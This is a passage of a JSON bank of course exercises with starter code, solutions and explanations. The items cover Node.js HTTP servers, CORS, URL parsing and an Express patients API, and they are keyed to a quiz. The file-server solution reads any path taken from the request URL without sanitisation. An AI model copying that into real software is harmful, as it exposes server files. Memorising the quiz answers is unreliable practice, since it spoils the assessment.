5, ISAQuiz7","prompt_html":"\u003cp\u003eThe Slide 5 AJAX/CORS flow — client sends a GET request, server responds with the \u003ccode\u003eAccess-Control-Allow-Origin\u003c/code\u003e header:\u003c/p\u003e\n\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"640\" height=\"200\" font-family=\"monospace\" font-size=\"13\"\u003e\n  \u003crect x=\"20\" y=\"60\" width=\"160\" height=\"80\" rx=\"6\" fill=\"#e8f4fd\" stroke=\"#2980b9\" stroke-width=\"2\"/\u003e\n  \u003ctext x=\"100\" y=\"96\" text-anchor=\"middle\" font-weight=\"bold\"\u003eClient\u003c/text\u003e\n  \u003ctext x=\"100\" y=\"114\" text-anchor=\"middle\" font-size=\"11\"\u003e(ajax.html)\u003c/text\u003e\n  \u003ctext x=\"100\" y=\"132\" text-anchor=\"middle\" font-size=\"10\" fill=\"#555\"\u003eXMLHttpRequest\u003c/text\u003e\n  \u003cline x1=\"180\" y1=\"90\" x2=\"380\" y2=\"90\" stroke=\"#555\" stroke-width=\"1.5\" marker-end=\"url(#arrow)\"/\u003e\n  \u003ctext x=\"280\" y=\"82\" text-anchor=\"middle\" font-size=\"11\"\u003eGET /api/hello\u003c/text\u003e\n  \u003cline x1=\"380\" y1=\"110\" x2=\"180\" y2=\"110\" stroke=\"#27ae60\" stroke-width=\"1.5\" marker-end=\"url(#arrow-green)\"/\u003e\n  \u003ctext x=\"280\" y=\"128\" text-anchor=\"middle\" font-size=\"11\" fill=\"#27ae60\"\u003eAccess-Control-Allow-Origin: *\u003c/text\u003e\n  \u003crect x=\"380\" y=\"60\" width=\"160\" height=\"80\" rx=\"6\" fill=\"#eafaf1\" stroke=\"#27ae60\" stroke-width=\"2\"/\u003e\n  \u003ctext x=\"460\" y=\"96\" text-anchor=\"middle\" font-weight=\"bold\"\u003eServer\u003c/text\u003e\n  \u003ctext x=\"460\" y=\"114\" text-anchor=\"middle\" font-size=\"11\"\u003e(app.js)\u003c/text\u003e\n  \u003cdefs\u003e\n    \u003cmarker id=\"arrow\" markerWidth=\"8\" markerHeight=\"8\" refX=\"6\" refY=\"3\" orient=\"auto\"\u003e\n      \u003cpath d=\"M0,0 L0,6 L8,3 z\" fill=\"#555\"/\u003e\n    \u003c/marker\u003e\n    \u003cmarker id=\"arrow-green\" markerWidth=\"8\" markerHeight=\"8\" refX=\"6\" refY=\"3\" orient=\"auto\"\u003e\n      \u003cpath d=\"M0,0 L0,6 L8,3 z\" fill=\"#27ae60\"/\u003e\n    \u003c/marker\u003e\n  \u003c/defs\u003e\n\u003c/svg\u003e\n\n\u003cp\u003eComplete the Node.js HTTP server below so that:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eIt handles \u003ccode\u003eGET /api/hello\u003c/code\u003e and responds with \u003ccode\u003e{ &quot;message&quot;: &quot;Hello&quot; }\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eIt sets the correct CORS header so \u003cstrong\u003eany\u003c/strong\u003e origin can read the response.\u003c/li\u003e\n\u003cli\u003eIt handles the OPTIONS preflight and responds with status 204.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eYour server must use \u003ccode\u003eres\u003c/code\u003e (not \u003ccode\u003ereq\u003c/code\u003e) for all response operations.\u003c/p\u003e","starter":"const http = require(\"http\");\n\nconst server = http.createServer((req, res) =\u003e {\n  // Handle CORS preflight\n  if (req.method === \"OPTIONS\") {\n    res.writeHead(204, {\n      \"Access-Control-Allow-Origin\": /* ??? */,\n      \"Access-Control-Allow-Methods\": \"GET, OPTIONS\",\n      \"Access-Control-Allow-Headers\": \"Content-Type\",\n    });\n    res.end();\n    return;\n  }\n\n  if (req.method === \"GET\" && req.url === \"/api/hello\") {\n    res.writeHead(200, {\n      \"Content-Type\": \"application/json\",\n      \"Access-Control-Allow-Origin\": /* ??? */,\n    });\n    /* write the response body here */\n    res.end();\n  } else {\n    res.writeHead(404);\n    res.end();\n  }\n});\n\nserver.listen(8000, () =\u003e {\n  console.log(\"Server running on port 8000\");\n});","solution":"const http = require(\"http\");\n\nconst server = http.createServer((req, res) =\u003e {\n  // Handle CORS preflight\n  if (req.method === \"OPTIONS\") {\n    res.writeHead(204, {\n      \"Access-Control-Allow-Origin\": \"*\",\n      \"Access-Control-Allow-Methods\": \"GET, OPTIONS\",\n      \"Access-Control-Allow-Headers\": \"Content-Type\",\n    });\n    res.end();\n    return;\n  }\n\n  if (req.method === \"GET\" && req.url === \"/api/hello\") {\n    res.writeHead(200, {\n      \"Content-Type\": \"application/json\",\n      \"Access-Control-Allow-Origin\": \"*\",\n    });\n    res.write(JSON.stringify({ message: \"Hello\" }));\n    res.end();\n  } else {\n    res.writeHead(404);\n    res.end();\n  }\n});\n\nserver.listen(8000, () =\u003e {\n  console.log(\"Server running on port 8000\");\n});","why_html":"\u003cp\u003e\u003cstrong\u003e\u003ccode\u003e&quot;*&quot;\u003c/code\u003e in \u003ccode\u003eAccess-Control-Allow-Origin\u003c/code\u003e\u003c/strong\u003e: tells the browser any origin may read this response. Without this header the browser receives the response but withholds it from the script, logging a CORS error. The server received the request either way — SOP only prevents the \u003cem\u003escript\u003c/em\u003e from accessing the response.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eres\u003c/code\u003e not \u003ccode\u003ereq\u003c/code\u003e\u003c/strong\u003e: \u003ccode\u003ehttp.createServer\u003c/code\u003e provides \u003ccode\u003e(req, res)\u003c/code\u003e. \u003ccode\u003ereq\u003c/code\u003e is the incoming readable stream; it carries the client&#39;s data. \u003ccode\u003eres\u003c/code\u003e is the outgoing writable stream; \u003ccode\u003ewriteHead\u003c/code\u003e, \u003ccode\u003ewrite\u003c/code\u003e, and \u003ccode\u003eend\u003c/code\u003e all belong on \u003ccode\u003eres\u003c/code\u003e. Calling \u003ccode\u003ereq.writeHead(...)\u003c/code\u003e throws immediately because \u003ccode\u003ereq\u003c/code\u003e has no such method. This is the most common exam trap for ISAQuiz7 Q4.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003ereadyState == 4\u003c/code\u003e not \u003ccode\u003e== 5\u003c/code\u003e\u003c/strong\u003e: \u003ccode\u003ereadyState\u003c/code\u003e spans 0–4. DONE is 4. Code that checks \u003ccode\u003ereadyState == 5\u003c/code\u003e never fires because that state does not exist.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePreflight (OPTIONS) response with 204\u003c/strong\u003e: the browser expects a successful (2xx) response to its OPTIONS preflight before it sends the real request. Returning 404 or omitting CORS headers on OPTIONS causes the browser to abort the entire flow without the actual GET ever executing.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":16,"id":"nodejs-basics","title":"Minimal non-blocking HTTP server","lang":"js","tags":["nodejs","http","non-blocking","server-scripting"],"source":"Slide 4","prompt_html":"\u003cp\u003eThe diagram below shows Node.js&#39;s three threading models side by side. Study it, then write a minimal Node.js HTTP server that responds with \u003ccode\u003e&quot;Hello from Node.js!&quot;\u003c/code\u003e without blocking the event loop.\u003c/p\u003e\n\u003csvg viewBox=\"0 0 720 220\" xmlns=\"http://www.w3.org/2000/svg\" font-family=\"monospace\" font-size=\"13\"\u003e\n  \u003c!-- Example 1: Single-threaded non-blocking --\u003e\n  \u003crect x=\"10\" y=\"10\" width=\"210\" height=\"200\" rx=\"6\" fill=\"#f0f9ff\" stroke=\"#0ea5e9\" stroke-width=\"1.5\"/\u003e\n  \u003ctext x=\"115\" y=\"32\" text-anchor=\"middle\" font-weight=\"bold\" fill=\"#0369a1\"\u003eExample 1\u003c/text\u003e\n  \u003ctext x=\"115\" y=\"48\" text-anchor=\"middle\" font-size=\"11\" fill=\"#0369a1\"\u003eSingle-threaded non-blocking\u003c/text\u003e\n  \u003crect x=\"25\" y=\"58\" width=\"80\" height=\"24\" rx=\"3\" fill=\"#0ea5e9\"/\u003e\n  \u003ctext x=\"65\" y=\"74\" text-anchor=\"middle\" fill=\"white\" font-size=\"11\"\u003e1 Thread\u003c/text\u003e\n  \u003cline x1=\"65\" y1=\"82\" x2=\"65\" y2=\"105\" stroke=\"#0ea5e9\" stroke-width=\"1.5\" stroke-dasharray=\"4,2\"/\u003e\n  \u003crect x=\"25\" y=\"105\" width=\"80\" height=\"20\" rx=\"3\" fill=\"#bae6fd\"/\u003e\n  \u003ctext x=\"65\" y=\"119\" text-anchor=\"middle\" font-size=\"10\" fill=\"#0369a1\"\u003eReq 1 → OS\u003c/text\u003e\n  \u003cline x1=\"115\" y1=\"115\" x2=\"175\" y2=\"115\" stroke=\"#64748b\" stroke-width=\"1\" marker-end=\"url(#arr)\"/\u003e\n  \u003crect x=\"25\" y=\"132\" width=\"80\" height=\"20\" rx=\"3\" fill=\"#bae6fd\"/\u003e\n  \u003ctext x=\"65\" y=\"146\" text-anchor=\"middle\" font-size=\"10\" fill=\"#0369a1\"\u003eReq 2 → OS\u003c/text\u003e\n  \u003crect x=\"25\" y=\"158\" width=\"80\" height=\"20\" rx=\"3\" fill=\"#bae6fd\"/\u003e\n  \u003ctext x=\"65\" y=\"172\" text-anchor=\"middle\" font-size=\"10\" fill=\"#0369a1\"\u003eReq 3 → OS\u003c/text\u003e\n  \u003crect x=\"120\" y=\"105\" width=\"80\" height=\"73\" rx=\"3\" fill=\"#e0f2fe\"/\u003e\n  \u003ctext x=\"160\" y=\"130\" text-anchor=\"middle\" font-size=\"10\" fill=\"#0369a1\"\u003eOS handles\u003c/text\u003e\n  \u003ctext x=\"160\" y=\"144\" text-anchor=\"middle\" font-size=\"10\" fill=\"#0369a1\"\u003eall I/O\u003c/text\u003e\n  \u003ctext x=\"160\" y=\"158\" text-anchor=\"middle\" font-size=\"10\" fill=\"#0369a1\"\u003ecallbacks fire\u003c/text\u003e\n  \u003ctext x=\"160\" y=\"172\" text-anchor=\"middle\" font-size=\"10\" fill=\"#0369a1\"\u003ewhen ready\u003c/text\u003e\n\n  \u003c!-- Example 2: Single-threaded blocking --\u003e\n  \u003crect x=\"255\" y=\"10\" width=\"210\" height=\"200\" rx=\"6\" fill=\"#fff7ed\" stroke=\"#f97316\" stroke-width=\"1.5\"/\u003e\n  \u003ctext x=\"360\" y=\"32\" text-anchor=\"middle\" font-weight=\"bold\" fill=\"#c2410c\"\u003eExample 2\u003c/text\u003e\n  \u003ctext x=\"360\" y=\"48\" text-anchor=\"middle\" font-size=\"11\" fill=\"#c2410c\"\u003eSingle-threaded blocking\u003c/text\u003e\n  \u003crect x=\"270\" y=\"58\" width=\"80\" height=\"24\" rx=\"3\" fill=\"#f97316\"/\u003e\n  \u003ctext x=\"310\" y=\"74\" text-anchor=\"middle\" fill=\"white\" font-size=\"11\"\u003e1 Thread\u003c/text\u003e\n  \u003crect x=\"270\" y=\"90\" width=\"80\" height=\"20\" rx=\"3\" fill=\"#fed7aa\"/\u003e\n  \u003ctext x=\"310\" y=\"104\" text-anchor=\"middle\" font-size=\"10\" fill=\"#c2410c\"\u003eReq 1 → wait\u003c/text\u003e\n  \u003crect x=\"270\" y=\"116\" width=\"80\" height=\"30\" rx=\"3\" fill=\"#fecaca\" stroke=\"#dc2626\" stroke-width=\"1\"/\u003e\n  \u003ctext x=\"310\" y=\"133\" text-anchor=\"middle\" font-size=\"10\" fill=\"#991b1b\"\u003eBLOCKED\u003c/text\u003e\n  \u003crect x=\"270\" y=\"152\" width=\"80\" height=\"20\" rx=\"3\" fill=\"#fed7aa\"/\u003e\n  \u003ctext x=\"310\" y=\"166\" text-anchor=\"middle\" font-size=\"10\" fill=\"#c2410c\"\u003eReq 2 → wait\u003c/text\u003e\n  \u003crect x=\"270\" y=\"178\" width=\"80\" height=\"22\" rx=\"3\" fill=\"#fecaca\" stroke=\"#dc2626\" stroke-width=\"1\"/\u003e\n  \u003ctext x=\"310\" y=\"193\" text-anchor=\"middle\" font-size=\"10\" fill=\"#991b1b\"\u003eBLOCKED\u003c/text\u003e\n\n  \u003c!-- Example 3: Multi-threaded --\u003e\n  \u003crect x=\"500\" y=\"10\" width=\"210\" height=\"200\" rx=\"6\" fill=\"#f0fdf4\" stroke=\"#22c55e\" stroke-width=\"1.5\"/\u003e\n  \u003ctext x=\"605\" y=\"32\" text-anchor=\"middle\" font-weight=\"bold\" fill=\"#15803d\"\u003eExample 3\u003c/text\u003e\n  \u003ctext x=\"605\" y=\"48\" text-anchor=\"middle\" font-size=\"11\" fill=\"#15803d\"\u003eMulti-threaded (thread/request)\u003c/text\u003e\n  \u003crect x=\"515\" y=\"60\" width=\"65\" height=\"18\" rx=\"3\" fill=\"#22c55e\"/\u003e\n  \u003ctext x=\"547\" y=\"73\" text-anchor=\"middle\" fill=\"white\" font-size=\"10\"\u003eThread 1\u003c/text\u003e\n  \u003crect x=\"515\" y=\"82\" width=\"65\" height=\"18\" rx=\"3\" fill=\"#22c55e\"/\u003e\n  \u003ctext x=\"547\" y=\"95\" text-anchor=\"middle\" fill=\"white\" font-size=\"10\"\u003eThread 2\u003c/text\u003e\n  \u003crect x=\"515\" y=\"104\" width=\"65\" height=\"18\" rx=\"3\" fill=\"#22c55e\"/\u003e\n  \u003ctext x=\"547\" y=\"117\" text-anchor=\"middle\" fill=\"white\" font-size=\"10\"\u003eThread 3\u003c/text\u003e\n  \u003ctext x=\"547\" y=\"138\" text-anchor=\"middle\" font-size=\"18\" fill=\"#15803d\"\u003e...\u003c/text\u003e\n  \u003crect x=\"515\" y=\"150\" width=\"65\" height=\"18\" rx=\"3\" fill=\"#22c55e\"/\u003e\n  \u003ctext x=\"547\" y=\"163\" text-anchor=\"middle\" fill=\"white\" font-size=\"10\"\u003eThread 100\u003c/text\u003e\n  \u003ctext x=\"605\" y=\"185\" text-anchor=\"middle\" font-size=\"11\" fill=\"#15803d\"\u003eEach blocks on I/O\u003c/text\u003e\n  \u003ctext x=\"605\" y=\"200\" text-anchor=\"middle\" font-size=\"11\" fill=\"#dc2626\"\u003e100 threads in memory\u003c/text\u003e\n\u003c/svg\u003e\n\n\u003cp\u003eRequirements:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse only the built-in \u003ccode\u003ehttp\u003c/code\u003e module (no Express, no third-party packages).\u003c/li\u003e\n\u003cli\u003eSet the response status to \u003ccode\u003e200\u003c/code\u003e and \u003ccode\u003eContent-Type\u003c/code\u003e to \u003ccode\u003etext/plain\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eWrite \u003ccode\u003e&quot;Hello from Node.js!&quot;\u003c/code\u003e to the response body.\u003c/li\u003e\n\u003cli\u003eListen on port \u003ccode\u003e3000\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e","starter":"const http = require('http');\n\nconst server = http.createServer((req, res) =\u003e {\n  // TODO: set response status code and Content-Type header\n  // Hint: use res.writeHead(statusCode, headersObject)\n\n  // TODO: write the response body\n  // Hint: use res.write(body)\n\n  // TODO: signal that the response is complete\n  // Hint: use res.end()\n});\n\n// TODO: tell the server to listen on port 3000\n// Hint: server.listen(port, callback)","solution":"const http = require('http');\n\nconst server = http.createServer((req, res) =\u003e {\n  res.writeHead(200, { 'Content-Type': 'text/plain' });\n  res.write('Hello from Node.js!');\n  res.end();\n});\n\nserver.listen(3000, () =\u003e {\n  console.log('Server running on http://localhost:3000');\n});","why_html":"\u003cp\u003e\u003ccode\u003ehttp.createServer()\u003c/code\u003e registers a callback that fires for every incoming HTTP request. The callback receives the request (\u003ccode\u003ereq\u003c/code\u003e) and response (\u003ccode\u003eres\u003c/code\u003e) objects — write headers and body on the \u003cstrong\u003eresponse\u003c/strong\u003e object, not the request.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eres.writeHead(200, { &#39;Content-Type&#39;: &#39;text/plain&#39; })\u003c/code\u003e sends the HTTP status line and headers. \u003ccode\u003eres.write()\u003c/code\u003e buffers body content. \u003ccode\u003eres.end()\u003c/code\u003e flushes the buffer and closes the connection — omitting it leaves the client waiting forever.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eserver.listen()\u003c/code\u003e is \u003cstrong\u003enon-blocking\u003c/strong\u003e: it registers a port listener with the OS and returns immediately. The Node.js event loop is now running, and every incoming connection fires the request callback asynchronously. The server never sits blocked between requests.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon mistake:\u003c/strong\u003e calling \u003ccode\u003ereadFileSync\u003c/code\u003e inside the request handler to load a template. \u003ccode\u003ereadFileSync\u003c/code\u003e blocks the entire event loop — every other request waits while the file loads. Replace it with \u003ccode\u003efs.readFile(path, callback)\u003c/code\u003e so the thread stays free to handle other requests while the OS reads the file.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eQuiz 7 note:\u003c/strong\u003e \u003ccode\u003eres.writeHead()\u003c/code\u003e, \u003ccode\u003eres.write()\u003c/code\u003e, and \u003ccode\u003eres.end()\u003c/code\u003e all operate on the \u003cstrong\u003eresponse\u003c/strong\u003e (\u003ccode\u003eres\u003c/code\u003e) object. Calling them on \u003ccode\u003ereq\u003c/code\u003e is a common exam distractor and will throw a runtime error.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":17,"id":"nodejs-modules","title":"Node.js file server — http, url, fs","lang":"js","tags":["modules","require","http","url","fs"],"source":"Slide 4, ISAQuiz7","prompt_html":"\u003cp\u003eA client browser sends this request to your Node.js server:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eGET http://localhost:8000/admin.html?user=123 HTTP/1.1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eVisualized as URL parts — \u003ccode\u003epathname\u003c/code\u003e vs \u003ccode\u003epath\u003c/code\u003e is the key distinction (ISAQuiz7 Q3):\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e┌─────────────────────────────────────────────────────────────┐\n│  http://localhost:8000/admin.html?user=123                  │\n│  └──────┘ └────────────┘└──────────┘└────────┘             │\n│  protocol     host       pathname    search                  │\n│                                                              │\n│  url.parse(req.url, true)                                    │\n│  ├── .host      → &#39;localhost:8000&#39;                          │\n│  ├── .pathname  → &#39;/admin.html&#39;          ← use this         │\n│  ├── .path      → &#39;/admin.html?user=123&#39; ← NOT this         │\n│  ├── .search    → &#39;?user=123&#39;                               │\n│  └── .query     → { user: &#39;123&#39; }                           │\n└─────────────────────────────────────────────────────────────┘\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWrite a Node.js HTTP server that:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eParses the incoming request URL using the \u003ccode\u003eurl\u003c/code\u003e module to extract the \u003cstrong\u003epathname only\u003c/strong\u003e (not the full path with query string).\u003c/li\u003e\n\u003cli\u003eAttempts to read the file at that pathname using \u003ccode\u003efs.readFile\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eIf the file exists, responds with HTTP 200 and the file contents.\u003c/li\u003e\n\u003cli\u003eIf the file does not exist, responds with HTTP 404 and the text \u003ccode\u003e&#39;404 Not Found&#39;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eListens on port 8000.\u003c/li\u003e\n\u003c/ol\u003e","starter":"const http = require('______');\nconst url = require('______');\nconst fs = require('______');\n\nhttp.createServer(function(req, res) {\n  // Step 1: parse the URL — get the pathname without the query string\n  const q = url.parse(______, true);\n  const filename = '.' + q.______;  // e.g. './admin.html'\n\n  // Step 2: read the file\n  fs.readFile(filename, function(err, data) {\n    if (err) {\n      // Step 3a: file not found\n      res.______(404, { 'Content-Type': 'text/html' });\n      res.end('404 Not Found');\n      return;\n    }\n    // Step 3b: file found\n    res.______(200, { 'Content-Type': 'text/html' });\n    res.______(data);\n    res.end();\n  });\n\n}).______; // Step 4: bind to port 8000","solution":"const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer(function(req, res) {\n  // Step 1: parse the URL — pathname gives path WITHOUT query string\n  const q = url.parse(req.url, true);\n  const filename = '.' + q.pathname;  // e.g. './admin.html'\n\n  // Step 2: read the file asynchronously\n  fs.readFile(filename, function(err, data) {\n    if (err) {\n      // Step 3a: file does not exist — send 404\n      res.writeHead(404, { 'Content-Type': 'text/html' });\n      res.end('404 Not Found');\n      return;  // stop here — prevents res.end() from being called twice\n    }\n    // Step 3b: file found — send its contents\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.write(data);\n    res.end();\n  });\n\n}).listen(8000);","why_html":"\u003cp\u003e\u003cstrong\u003eWhy \u003ccode\u003epathname\u003c/code\u003e and not \u003ccode\u003epath\u003c/code\u003e?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eurl.parse()\u003c/code\u003e splits the URL into components. \u003ccode\u003epath\u003c/code\u003e includes the query string: \u003ccode\u003e/admin.html?user=123\u003c/code\u003e. \u003ccode\u003epathname\u003c/code\u003e stops before the \u003ccode\u003e?\u003c/code\u003e: \u003ccode\u003e/admin.html\u003c/code\u003e. The file on disk is named \u003ccode\u003eadmin.html\u003c/code\u003e, not \u003ccode\u003eadmin.html?user=123\u003c/code\u003e. Using \u003ccode\u003epath\u003c/code\u003e as the filename causes \u003ccode\u003efs.readFile\u003c/code\u003e to fail even when the file exists — you get an unnecessary 404. (ISAQuiz7 Q3 tests exactly this distinction.)\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy \u003ccode\u003eres\u003c/code\u003e and not \u003ccode\u003ereq\u003c/code\u003e?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ereq\u003c/code\u003e is the \u003ccode\u003eIncomingMessage\u003c/code\u003e object — it carries data arriving from the client (URL, headers, body). \u003ccode\u003eres\u003c/code\u003e is the \u003ccode\u003eServerResponse\u003c/code\u003e object — it is the writable stream that sends data back to the client. \u003ccode\u003eres.writeHead\u003c/code\u003e, \u003ccode\u003eres.write\u003c/code\u003e, and \u003ccode\u003eres.end\u003c/code\u003e are the only methods that put bytes on the wire to the browser. \u003ccode\u003ereq.writeHead\u003c/code\u003e does not exist; calling it throws \u003ccode\u003eTypeError: req.writeHead is not a function\u003c/code\u003e. (ISAQuiz7 Q4 presents a version of the server using \u003ccode\u003ereq\u003c/code\u003e as the distractor.)\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy do you need \u003ccode\u003e.listen(8000)\u003c/code\u003e?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttp.createServer()\u003c/code\u003e returns a server object but does not bind it to any port. Without \u003ccode\u003e.listen()\u003c/code\u003e, the Node.js process has no open handles and exits immediately. No requests can arrive if the server is not listening.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon wrong answers from ISAQuiz7:\u003c/strong\u003e\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eWrong\u003c/th\u003e\n\u003cth\u003eWhy it is wrong\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eUse \u003ccode\u003eq.path\u003c/code\u003e as filename\u003c/td\u003e\n\u003ctd\u003eIncludes query string — file lookup always fails\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eWrite response with \u003ccode\u003ereq.writeHead\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ereq has no writeHead — TypeError at runtime\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePass port number inside \u003ccode\u003ewriteHead\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ewriteHead takes status code and headers, not a port\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eOmit \u003ccode\u003e.listen()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eServer exits immediately, never accepts connections\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"code","variant":"starter-solution","n":18,"id":"express-framework","title":"Build an Express REST API with CORS middleware","lang":"js","tags":["express","routing","middleware","rest","npm"],"source":"Slide 8","prompt_html":"\u003cp\u003eBuild an Express server that:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eReads the port from \u003ccode\u003eprocess.env.PORT\u003c/code\u003e with a fallback of \u003ccode\u003e8888\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eApplies a CORS middleware (using \u003ccode\u003eapp.use\u003c/code\u003e) that sets \u003ccode\u003eAccess-Control-Allow-Origin\u003c/code\u003e, \u003ccode\u003eAccess-Control-Allow-Methods\u003c/code\u003e, and \u003ccode\u003eAccess-Control-Allow-Headers\u003c/code\u003e on every response, then calls \u003ccode\u003enext()\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eApplies \u003ccode\u003eexpress.json()\u003c/code\u003e middleware to parse JSON request bodies.\u003c/li\u003e\n\u003cli\u003eExposes four RESTful endpoints for a patients resource:\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eGET /api/v1/patients\u003c/code\u003e — return the full \u003ccode\u003epatients\u003c/code\u003e array as JSON.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eGET /api/v1/patients/:id\u003c/code\u003e — return the patient at the given index.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ePOST /api/v1/patients\u003c/code\u003e — append \u003ccode\u003ereq.body\u003c/code\u003e to \u003ccode\u003epatients\u003c/code\u003e, respond with status 201 and a JSON confirmation.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ePUT /api/v1/patients/:id\u003c/code\u003e — replace the patient at the given index with \u003ccode\u003ereq.body\u003c/code\u003e, respond with a JSON confirmation.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eStarts the server on \u003ccode\u003ePORT\u003c/code\u003e and logs the port number.\u003c/li\u003e\n\u003c/ol\u003e","starter":"const express = require('express');\nconst app = express();\nconst PORT = // TODO: read from process.env or default to 8888\n\n// In-memory data store\nlet patients = [\n    { id: 1, name: 'Alice', age: 30 },\n    { id: 2, name: 'Bob',   age: 45 },\n];\n\n// TODO: CORS middleware — set the three Access-Control-Allow-* headers, then call next()\napp.use((req, res, next) =\u003e {\n\n});\n\n// TODO: body-parsing middleware\napp.use(/* ??? */);\n\n// TODO: GET all patients\napp.get('/api/v1/patients', (req, res) =\u003e {\n\n});\n\n// TODO: GET one patient by id (use req.params.id)\napp.get('/api/v1/patients/:id', (req, res) =\u003e {\n\n});\n\n// TODO: POST — create new patient (data in req.body, respond 201)\napp./* ??? */('/api/v1/patients', (req, res) =\u003e {\n\n});\n\n// TODO: PUT — replace entire patient at :id (data in req.body)\napp./* ??? */('/api/v1/patients/:id', (req, res) =\u003e {\n\n});\n\n// TODO: start the server\napp.listen(/* ??? */, () =\u003e {\n\n});","solution":"const express = require('express');\nconst app = express();\nconst PORT = process.env.PORT || 8888;\n\n// In-memory data store\nlet patients = [\n    { id: 1, name: 'Alice', age: 30 },\n    { id: 2, name: 'Bob',   age: 45 },\n];\n\n// CORS middleware — registered once, applies to every request\napp.use((req, res, next) =\u003e {\n    res.setHeader('Access-Control-Allow-Origin', '*');\n    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');\n    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');\n    next(); // must call next() or the request stalls\n});\n\n// Body-parsing middleware — populates req.body for POST and PUT\napp.use(express.json());\n\n// GET all patients — 200 OK with JSON array\napp.get('/api/v1/patients', (req, res) =\u003e {\n    res.json(patients);\n});\n\n// GET one patient by id — id comes from URL segment\napp.get('/api/v1/patients/:id', (req, res) =\u003e {\n    const id = parseInt(req.params.id, 10);\n    const patient = patients.find(p =\u003e p.id === id);\n    if (!patient) {\n        return res.status(404).json({ error: 'Patient not found' });\n    }\n    res.json(patient);\n});\n\n// POST — create new patient (not idempotent; each call adds a record)\napp.post('/api/v1/patients', (req, res) =\u003e {\n    const data = req.body;\n    patients.push(data);\n    res.status(201).json({ message: 'Patient created', patient: data });\n});\n\n// PUT — replace entire patient record at :id (idempotent)\napp.put('/api/v1/patients/:id', (req, res) =\u003e {\n    const id = parseInt(req.params.id, 10);\n    const index = patients.findIndex(p =\u003e p.id === id);\n    if (index === -1) {\n        return res.status(404).json({ error: 'Patient not found' });\n    }\n    patients[index] = { ...req.body, id }; // replace all fields\n    res.json({ message: 'Patient replaced', patient: patients[index] });\n});\n\n// Start server\napp.listen(PORT, () =\u003e {\n    console.log(`Server running on port ${PORT}`);\n});","why_html":"\u003cp\u003e\u003cstrong\u003eWhy must middleware call \u003ccode\u003enext()\u003c/code\u003e?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eExpress processes middleware in the order registered. Each middleware either sends a response (ending the pipeline) or calls \u003ccode\u003enext()\u003c/code\u003e to hand off to the next middleware or route handler. CORS middleware only sets headers — it does not send a response. Without \u003ccode\u003enext()\u003c/code\u003e, Express has no signal to continue, so the request hangs and the client times out. Every middleware that does not terminate the request must call \u003ccode\u003enext()\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy is PUT idempotent but POST is not?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eAn operation is idempotent if applying it multiple times produces the same result as applying it once. PUT sends a complete replacement document for a specific resource id. Sending the same PUT twice leaves the resource in exactly the same final state — the second call overwrites the first with identical data. POST, by contrast, creates a new resource on each call. Two identical POST requests produce two separate patient records.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon wrong approach: CORS headers inside each route handler\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003ePlacing \u003ccode\u003eres.setHeader(&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;)\u003c/code\u003e inside individual route handlers instead of shared middleware has two failure modes. First, any route you forget to update leaks CORS errors in the browser. Second, it does not 